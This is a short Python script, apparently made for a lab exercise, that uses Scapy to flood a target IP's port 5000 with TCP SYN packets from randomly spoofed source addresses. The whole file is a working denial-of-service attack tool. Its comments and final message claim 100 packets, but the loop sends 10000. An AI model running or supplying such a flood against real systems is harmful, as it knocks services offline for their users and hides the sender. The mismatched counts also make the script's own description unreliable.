#!/usr/bin/env python3
# spoofed_syn_flood.py

from scapy.all import IP, TCP, send
import random

# Target server IP
target_ip = "10.1.11.206"

# Function to generate random spoofed IPs in local lab range
def random_ip():
    return f"192.168.56.{random.randint(1, 254)}"

# Loop to send multiple packets
for i in range(10000):  # e.g., send 100 spoofed packets
    spoofed_ip = random_ip()
    ip_layer = IP(src=spoofed_ip, dst=target_ip)
    tcp_layer = TCP(sport=random.randint(1024, 65535), dport=5000, flags="S", seq=random.randint(1000, 50000))
    packet = ip_layer / tcp_layer
    send(packet, verbose=0)

print("100 spoofed SYN packets sent.")
